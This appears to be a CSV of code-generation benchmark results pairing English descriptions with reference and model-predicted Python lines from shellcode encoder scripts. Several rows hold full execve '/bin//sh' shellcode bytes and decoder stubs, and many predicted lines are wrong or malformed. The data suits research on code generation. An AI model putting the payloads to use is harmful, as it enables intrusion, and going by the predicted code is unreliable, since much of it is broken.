idx,nl,gold,hyp
1,"remove '\\x' from the second argument, decode it in hexadecimal, and save in bad_chars","bad_chars = sys . argv [ 2 ] . replace ( ` \ \ x ` , ` ` ) . decode ( ` hex ` )",bad_chars = hex ( sys . argv [ 2 ] )
3,exit from the iteration,break,sys . exit ( )
44,Convert the variable x to a hexadecimal and store it in the variable decoded,decoded + = ` % 02x ` % x,decoded = ` % 02x ` % x
45,initialize an empty string variable called decoded,decoded = ` `,decoded = `
47,add the string value '0x' to the variable decoded,decoded2 + = ` 0x `,decoded + = ` 0x `
48,initialize an empty string variable called decoded2,decoded2 = ` `,decoded2 = `
49,append '\x02\xeb\xe4\xe8\xdc\xff\xff\xff' to decoder_stub,decoder_stub + = ` \ x02 \ xeb \ xe4 \ xe8 \ xdc \ xff \ xff \ xff `,decoder_stub . append ( ` \ x02 \ xeb \ xe4 \ xe8 \ xdc \ xff \ xff \ xff ` )
51,append '\x31\xd8\x66\x89\x07\x41\x8d\x7f' to decoder_stub,decoder_stub + = ` \ x31 \ xd8 \ x66 \ x89 \ x07 \ x41 \ x8d \ x7f `,decoder_stub . append ( ` \ x31 \ xd8 \ x66 \ x89 \ x07 \ x41 \ x8d \ x7f ` )
67,in decoder_stub replace '\x45' with bytes object containing the value xor_byte packed according to the format string unsigned char,"decoder_stub = decoder_stub . replace ( ` \ x45 ` , struct . pack ( ` B ` , xor_byte ) )","decoder_stub . replace ( b ` ` \ \ x ` ` , struct . pack ( ` B ` , xor_byte ) )"
68,for each element in decoder_stub convert the element to an integer representing the unicode then convert it to a hexadecimal ignore slice at index 2 until the end and join separating each element by the string '\\x',decoder_stub_hex = ` ` . join ( ` \ \ x { } ` . format ( hex ( ord ( x ) ) [ 2 : ] ) for x in decoder_stub ),"ignore = ` . join ( ` 0x { : 02x } , ` . format ( x ) for x in decoder_stub )"
70,define a method named mask that takes in n as a parameter,def mask ( n ) :,def that ( n ) :
71,"define a method named rol with the parameters n, rotations, and width. Width has a default value of 8","def rol ( n , rotations , width = 8 ) :","def rol ( n , rotations , width , Width = 8 ) :"
72,"define a method named ror with the parameters n, rotations, and width. Width has a default value of 8","def ror ( n , rotations , width = 8 ) :","def ror ( n , rotations , width , Width = 8 ) :"
75,declare an else statement,else :,declare . else :
77,append 0x to encode,encode + = ` 0x `,encode + = 1
78,append 0xAA to encode,"encode + = ` 0x AA , `",encode + = 170
79,encode is an empty string,encode = ` `,encode = `
83,append string '\\x' followed by the conversion in hex of 0xAA to the string encoded,encoded + = ` \ \ x % 02x ` % 0x AA,encoded + = ` \ \ x % 02x ` % 170
84,Convert the variable rand to a hexadecimal and add it to the variable encoded,encoded + = ` \ \ x % 02x ` % rand,encoded + = ` % 02x ` % rand
88,append to the string encoded the hexadecimal conversion of the and operation between h and 0xff,encoded + = ` % 02x ` % ( h & 0xff ),a + = ` % 02x ` % ( h & 255 )
89,append to the string encoded the hexadecimal conversion of the and operation between x and 0xff,encoded + = ` % 02x ` % ( x & 0xff ),a + = ` % 02x ` % ( x & 255 )
93,append the value y converted in hex to the string encoded,encoded + = ` % 02x ` % y,"encoded + = ` % 02x , ` % y"
96,append to the string encoded the value (7 - (256 -x)) converted to hexadecimal,encoded + = ` % 02x ` % ( 7 - ( 256 - x ) ),` % 02x ` ` % ( 7 - ( 256 - x ) )
97,convert (x+7) to hexadecimal and append it to the string encoded,encoded + = ` % 02x ` % ( x + 7 ),encoded + = ` % 02x ` % x + 7
101,set encoded to an empty string,encoded = ` `,encoded = `
105,encoded is an empty string,encoded = ` `,encoded = `
106,initialize an empty string variable called encoded,encoded = ` `,encoded = `
107,"encoded is the concatenation of the string ""\\x"", the hexadecimal value of the length of array of bytes of the variable shellcode and the string ','","encoded = ` \ \ x % 02x , ` % len ( bytearray ( shellcode ) )","encoded = ` \ \ x % 02x , ` ` % len ( bytearray ( shellcode ) )"
109,append end to encoded,encoded = encoded + end,encoded + = end
111,"Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable encoded_nasm followed by ','","encoded_nasm + = ` % 02x , ` % ( z & 0xff )","encoded_nasm + = ` % 02x , ` % ( z & 255 )"
113,initialize the variable encoded_nasm to an empty string,encoded_nasm = ` `,encoded_nasm = `
120,Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable encoded_shellcode,encoded_shellcode + = ` % 02x ` % ( z & 0xff ),"encoded_shellcode + = ` % 02x , ` % ( z & 255 )"
122,initialize the variable encoded_shellcode to an empty string,encoded_shellcode = ` `,encoded_shellcode = `
123,append to encoded a bytes object containing the value val1 packed according to the format string unsigned char,"encoded . append ( struct . pack ( ` B ` , val1 ) )","shellcode . append ( struct . pack ( ` B ` , val1 ) )"
124,append to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char,"encoded . append ( struct . pack ( ` B ` , xor_byte ) )","shellcode . append ( struct . pack ( ` B ` , xor_byte ) )"
125,add to encoded a bytes object containing the value xor_byte packed according to the format string unsigned char,"encoded . append ( struct . pack ( ` B ` , xor_byte ) )","shellcode . append ( struct . pack ( ` B ` , xor_byte ) )"
126,append to encoded the bytes object containing the value xor_byte packed according to the format string unsigned char,"encoded . append ( struct . pack ( ` B ` , xor_byte ) )","shellcode . append ( struct . pack ( ` B ` , xor_byte ) )"
129,initialize an empty string variable called encoded1,encoded1 = ` `,encoded1 = `
132,"Convert the value of y bitwise and 0xff to a hexadecimal then add it to the variable encoded2 followed by the string ','","encoded2 + = ` % 02x , ` % ( y & 0xff )","encoded2 + = ` % 02x , ` % ( y & 255 )"
136,"convert (7 -(256 - x)) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded2","encoded2 + = ` % 02x , ` % ( 7 - ( 256 - x ) )","encoded2 + = ` % 02x , ` % ( 7 - x )"
137,"Convert the value of h bitwise and 0xff to a hexadecimal, concatenate the result with the string ',' and then add it to the variable encoded2","encoded2 + = ` % 02x , ` % ( h & 0xff )","encoded2 + = ` % 02x , ` % ( h & 255 )"
138,"convert (x+7) to hexadecimal, concatenate the result with the string ',' and append it to the string encoded2","encoded2 + = ` % 02x , ` % ( x + 7 )","encoded2 + = ` % 02x , ` % x + 7"
143,concatenate the string '0x' with the hexadecimal conversion of 0xAA and append the result to the string encoded2,"encoded2 + = ` 0x % 02x , ` % 0x AA","encoded2 + = ` 0x % 02x , ` % 170"
148,set the variable encoded2 to an empty string,encoded2 = ` `,encoded2 = `
152,encoded2 is an empty string,encoded2 = ` `,encoded2 = `
153,initialize an empty string variable called encoded2,encoded2 = ` `,encoded2 = `
159,convert the value x to hex and append it to the string encodedP2,encoded P2 + = ` % 02x ` % x,"encoded P2 + = ` % 02x , ` % x"
164,execve_shellcode is a bytearray of execve_shellcode,execve_shellcode = bytearray ( execve_shellcode ),execve_shellcode = os . name
166,exit with 1,exit ( 1 ),sys . exit ( 1 )
170,"Convert the value of leader to hexadecimal, then slice it between the indicies 2 and 3, convert it to an int16 and add its value to the variable fb","fb = int ( hex ( leader ) [ 2 : 3 ] , 16 )","fb + = int ( hex ( leader ) [ 2 : 3 ] , 16 )"
171,concatenate in the string final_shellcode the concatenation of '\\x' and the string byte encoded in hexadecimal,final_shellcode + = ` \ \ x ` + byte . encode ( ` hex ` ),out . write ( final_shellcode + ` \ \ x ` + byte . encode ( ` hex ` ) )
173,iterate bytes in list bad_chars,for byte in bad_chars :,for bytes in bad_chars :
179,loop through shellcode converted into a bytearray,for i in bytearray ( shellcode ) :,for z in bytearray ( shellcode ) :
181,loop over execve_shellcode,for i in execve_shellcode :,for y in execve_shellcode :
185,initialize a for loop with an iterator i with a range starting from 0 until the value of padding,"for i in range ( 0 , padding ) :","for i in range ( 0 , until ) :"
187,loop through shellcode converted into a bytearray,for x in bytearray ( shellcode ) :,for z in bytearray ( shellcode ) :
188,loop x over the bytearray of the string shellcode,for x in bytearray ( shellcode ) :,for x in shellcode :
190,loop through shellcode converted into a bytearray,for x in bytearray ( shellcode ) :,for z in bytearray ( shellcode ) :
193,loop through shellcode converted into a bytearray,for y in bytearray ( shellcode ) :,for z in bytearray ( shellcode ) :
204,check if the length of execve_shellcode is not even,if ( len ( execve_shellcode ) % 2 ) ! = 0 :,if len ( execve_shellcode ) % 2 = 0 :
205,check if the following expression is true r bitwise xor shellcode_original at index i is not equal to 0 and r bitwise xor shellcode_original at index i+1 does not equal 0 and r bitwise xor shellcode_original at index i+2 does not equal 0 and r bitwise xor shellcode_original at index i+3 does not equal 0,if ( r ^ shellcode_original [ i ] ! = 0 ) and ( r ^ shellcode_original [ i + 1 ] ! = 0 ) and ( r ^ shellcode_original [ i + 2 ] ! = 0 ) and ( r ^ shellcode_original [ i + 3 ] ! = 0 ) :,if ( r ^ shellcode_original [ i ] = 0 ) and ( r ^ shellcode_original [ i + 1 ] = 0 ) and ( r ^ shellcode_original [ i + 2 ] = 0 ) and ( r ^ shellcode_original [ i + 3 ] = 0 ) :
207,if count modulo 2 is different from zero,if count % 2 ! = 0 :,if count ( b ` ` : ) = 0 :
208,if counter modulo 2 is equal to 0,if counter % 2 = = 0 :,if counter . var0 = = 0 :
211,convert to integer base 16 the string byte encoded to hex and check if it is equal to i,"if i = = int ( byte . encode ( ` hex ` ) , 16 ) :","if int ( byte . encode ( ` hex ` ) , 16 ) = = i :"
212,if the length of shellcode_original is not divisable by 4,if len ( shellcode_original ) % 4 ! = 0 :,if len ( shellcode_original ) % 4 = 0 :
213,if the length of sys.argv is different from 3,if len ( sys . argv ) ! = 3 :,if len ( sys . argv ) = 3 :
218,if matched_a_byte is True,if matched_a_byte :,if matched_a_byte is True :
220,if matched_a_byte is not True,if not matched_a_byte :,if matched_a_byte is not True :
224,check if the bytes object containing the value val1 xor i packed according to the format string unsigned char is equal to bad_byte,"if struct . pack ( ` B ` , val1 ^ i ) = = bad_byte :","if struct . pack ( ` B ` ` , val1 ^ i ) = = bad_byte :"
225,if stub_has_bad_char is True,if stub_has_bad_char :,if stub_has_bad_char is True :
226,if total does not equal 2,if total ! = 2 :,if total = 2 :
229,check if x is equivalent to the element n in shellcode converted into a bytearray,if x = = bytearray ( shellcode ) [ n ] :,if x = = bytearray ( shellcode ) [ 0 ] :
232,if xor_byte is equal to 0,if xor_byte = = 0 :,if not xor_byte :
236,import the package random,import random ;,import random
245,return the length of array of bytes of the string shellcode,len ( bytearray ( shellcode ) ) ),return len ( bytearray ( shellcode ) )
246,"length_format_0x is the count of "","" in format_0x","length_format_0x = format_0x . count ( ` , ` )",length_format_0x = format_0x . count ( ` \ n ` )
255,convert shellcode to a bytearray and store its length in the variable n,n = len ( bytearray ( shellcode ) ),n = bytearray ( shellcode ) . length
257,"convert encoded to string and replace all occurrences of ""\\x"" with "",0x"" in it","nasm = str ( encoded ) . replace ( ` \ \ x ` , ` , 0x ` )","nasm = str ( encoded ) . replace ( ` \ \ x ` , ` _ ` )"
258,nbits is the second element of sys.argv converted to integer,nbits = int ( sys . argv [ 2 ] ),nbits = int ( sys . argv [ 1 ] )
259,new is not i and 0xff,new = ~ i & 0xff,new = ~ i & 255
270,set the variable padding equal to 4 minus the length of shellcode_original modulus 4,padding = 4 - ( len ( shellcode_original ) % 4 ),padding = 4 - len ( shellcode_original ) % 4
273,initialize a random number generator,random . seed ( ),"random . seed ( random . randint ( 0 , 1 ) )"
274,right shift by val2 the and operation between x and val1 and assign it to res1,res1 = ( ( x & val1 ) > > val2 ),res1 = ( x & val1 ) > > val2
275,perform the and operation between x shifted left by val2 and val1 and assign the result to res1,res1 = ( x < < val2 ) & ( val1 ),res1 = x < < val2 & val1
276,res2 is the result of the and operation between x and val1,res2 = ( x & val1 ),res2 = x & val1
278,right shift res2 by max_bits minus val2,res2 = res2 > > ( max_bits - val2 ),res2 = res2 > > max_bits - val2
279,left shift x by max_bits minus val2 and assign the result to res2,res2 = x < < ( max_bits - val2 ),res2 = x < < max_bits - val2
280,return the result of bitwise left shift of n by rotations bitwise and with mask_value bitwise or n  bitwise right shift by the subtraction of rotations from width,return ( ( n < < rotations ) & mask_value ) | ( n > > ( width - rotations ) ),return n < < rotations & bitwise | n > > width - rotations
281,return the result of n bitwise right shift with rotations or n bitwise left shift by width minus rotations and the bitwise and operation with mask_value,return ( n > > rotations ) | ( ( n < < ( width - rotations ) ) & mask_value ),return n & ( ~ n & ( rotations | n . bitwise ) - width - rotations & bitwise ) | n & ( ~ n & ( ~ n & bitwise ) - rotations & bitwise ) | n & mask_value
289,ROT is the first element of sys.argv converted to integer,ROT = int ( sys . argv [ 1 ] ),ROT = int ( sys . argv [ 0 ] )
290,store in the variable rotations the modulus of rotations and width,rotations % = width,rotations = rotations % width
293,"shellcode is a string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80""",shellcode = ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 `,shellcode = ( ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` )
295,"define shellcode as a tuple and add the string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80""",shellcode = ( ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x31 \ xc9 \ x89 \ xca \ x6a \ x0b \ x58 \ xcd \ x80 ` ),def add_ ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x31 \ xc9 \ x89 \ xca \ x6a \ x0b \ x58 \ xcd \ x80 ` ( shellcode ) :
296,"define shellcode as a tuple and add the string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80""",shellcode = ( ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` ),def add_ ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` ( shellcode ) :
298,"shellcode is a tuple containing the string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80""",shellcode = ( ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` ),"shellcode = ( ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` , )"
299,"Declare a tuple called shellcode and add the string ""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"" into it",shellcode = ( ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` ),"shellcode = ( ( shellcode , ) + ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` )"
300,"declare the tuple shellcode containing the string ""\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80""",shellcode = ( ` \ x31 \ xc0 \ x50 \ x68 \ x62 \ x61 \ x73 \ x68 \ x68 \ x62 \ x69 \ x6e \ x2f \ x68 \ x2f \ x2f \ x2f \ x2f \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` ),"shellcode = ( ` \ x31 \ xc0 \ x50 \ x68 \ x62 \ x61 \ x73 \ x68 \ x68 \ x62 \ x69 \ x6e \ x2f \ x68 \ x2f \ x2f \ x2f \ x2f \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` , )"
302,"Declare a tuple shellcode and add the string ""\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80"" into it",shellcode = ( ` \ x31 \ xc0 \ x50 \ x89 \ xe2 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ xb0 \ x0b \ xcd \ x80 ` ),"shellcode = ( ( shellcode , ) + ` \ x31 \ xc0 \ x50 \ x89 \ xe2 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ xb0 \ x0b \ xcd \ x80 ` )"
303,"store in the variable shellcode b""\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80""",shellcode = b ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` ;,shellcode = b ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 `
304,remove the first 2 items from shellcode,shellcode = shellcode [ 2 : : ],shellcode = shellcode [ 2 : ]
305,shellcode is the first argument after removing string '\\x' decoded in hexadecimal,"shellcode = sys . argv [ 1 ] . replace ( ` \ \ x ` , ` ` ) . decode ( ` hex ` )",shellcode = ` \ \ x ` . decode ( ` hex ` )
306,Declare a tuple shellcode and add the string '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' into it,shellcode = ( ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` ),"shellcode = ( ( shellcode , ) + ` \ x31 \ xc0 \ x50 \ x68 \ x2f \ x2f \ x73 \ x68 \ x68 \ x2f \ x62 \ x69 \ x6e \ x89 \ xe3 \ x50 \ x89 \ xe2 \ x53 \ x89 \ xe1 \ xb0 \ x0b \ xcd \ x80 ` )"
307,shellcode_encoded is an empty bitearray,shellcode_encoded = bytearray ( ),shellcode_encoded = [ ]
308,store in the variable shellcode_encoded_hex the hexadecimal values of shellcode_encoded separated by the string '\\x',shellcode_encoded_hex = ` ` . join ( ` \ \ x { : 02x } ` . format ( x ) for x in shellcode_encoded ),shellcode_encoded_hex = ` ` ` . join ( ` \ \ x { : 02x } ` ` . format ( z ) for z in shellcode_encoded )
309,"store in the variable shellcode_encoded_nasm the hexadecimal values of shellcode_encoded separated by the string '0x' and remove any trailing ','","shellcode_encoded_nasm = ` ` . join ( ` 0x { : 02x } , ` . format ( x ) for x in shellcode_encoded ) . rstrip ( ` , ` )","shellcode_encoded_nasm = ` . join ( ` 0x { : 02x } , ` . format ( x ) for x in shellcode_encoded ) . rstrip ( ` , ` )"
310,append the value 0x90 to shellcode_encoded,shellcode_encoded . append ( 0x90 ),shellcode_encoded . append ( value . 0x90 )
311,append the value 0xaa to shellcode_encoded,shellcode_encoded . append ( 0xaa ),shellcode_encoded . append ( 170 )
319,"read the file f as a bytearray from hexadecimal values remove whitespaces and replace all occurences of the string '\\x' with ''"" and store the result in shellcode_original","shellcode_original = bytearray . fromhex ( f . read ( ) . strip ( ) . replace ( ` \ \ x ` , ` ` ) )","shellcode_original = bytearray . fromhex ( f . read ( ) . replace ( ` \ \ x ` ` , ` ) )"
320,store in the variable shellcode_original_hex the hexadecimal values of shellcode_original separated by the string '\\x',shellcode_original_hex = ` ` . join ( ` \ \ x { : 02x } ` . format ( x ) for x in shellcode_original ),shellcode_original_hex = ` ` ` . join ( ` \ \ x { : 02x } ` ` . format ( z ) for z in shellcode_original )
322,shift is the first element of sys.argv converted to integer,shift = int ( sys . argv [ 1 ] ),shift = int ( sys . argv [ 0 ] )
323,string1 contains a string concatenated with the elements of encoded separated by the value of decoder_stub,string1 = decoder_stub . join ( encoded ),string1 = ` . join ( encoded )
327,subtract Dec_hopecode from 255 and store the result in variable suplX,supl X = 255 - Dec_hopcode,supl X = 255 - Dec_hopecode
329,append the element x of execve_shellcode to swapped,swapped . append ( execve_shellcode [ x ] ),swapped . append ( x )
330,append the element x + 1 of execve_shellcode to swapped,swapped . append ( execve_shellcode [ x + 1 ] ),swapped + = x [ 1 : ]
331,"separate every 4 characters of the string swapped with the separator "", ""","swapped = ` , ` . join ( swapped [ i : i + 4 ] for i in range ( 0 , len ( swapped ) , 4 ) )","swapped = ` . ` . join ( swapped [ i : i + 4 ] for i in range ( 0 , len ( swapped ) , 4 ) )"
334,terminate the program,sys . exit ( ),exit ( )
338,subtract 1 from 2 raised to max_bits and assign the result to val1,val1 = 2 * * max_bits - 1,val1 = 2 - max_bits
341,val2 is rbits modulo max_bits,val2 = r_bits % max_bits,val2 = rbits
345,start a while loop with the condition xor_byte_good if equivalent to False,while ( xor_byte_good = = False ) :,while xor_byte_good ( ) :
346,open the file stored in shellcode_file using an alias variable f,with open ( shellcode_file ) as f :,"with open ( shellcode_file , ` rb ` ` ) as f :"
349,x is not x,x = ~ x,x = x [ 1 : ]
353,x is x xor 0xDD,x = x ^ 0x DD,x = x ^ 170
355,set x to y minus 0x10,x = y - 0x10,x = y - 16
356,set x to y minus 0x2,x = y - 0x2,x = y - 2
357,xor is the second element of sys.argv converted to integer,xor = int ( sys . argv [ 2 ] ),xor = int ( sys . argv [ 1 ] )
358,XOR is the third element of sys.argv converted to integer,XOR = int ( sys . argv [ 3 ] ),XOR = int ( sys . argv [ 2 ] )
361,xor_byte is the output of the function find_valid_xor_byte with the input parameters string1 and bad_chars,"xor_byte = find_valid_xor_byte ( string1 , bad_chars )","xor_byte = find_valid_xor_byte ( string1 , bad_chars ) ^ byte"
364,XOR_HEX is XOR converted to hexadecimal,XOR_HEX = hex ( XOR ),XOR_HEX = ` % 02x ` % XOR
366,compute bitwise xor of y and the first element of shellcode converted into a byte array and store the result in the variable y,y ^ = bytearray ( shellcode ) [ 1 ],y = bytearray ( shellcode ) [ 0 ] ^ 255
368,y is not x,y = ~ x,y = x
369,compute bitwise xor of the first element in shellcode converted into a bytearray and the second element of shellcode converted into a byte array,y = bytearray ( shellcode ) [ 0 ] ^ bytearray ( shellcode ) [ 1 ],"bitwise = int ( shellcode [ 0 ] , 8 ) ^ shellcode [ 1 ]"
370,set the variable y to x bitwise xor of 0x88,y = x ^ 0x88,y = x ^ 170
371,set y to x bitwise xor of 0x97,y = x ^ 0x97,y = x ^ 170
372,y is x xor 0xAA,y = x ^ 0x AA,y = x ^ 170
373,set the variable y equal to x bitwise xor the element n of shellcode converted into a bytearray,y = x ^ bytearray ( shellcode ) [ n ],y = x ^ bytearray ( shellcode ) [ 0 ]
374,set the variable z to bitwise not x,z = ~ x,z = x
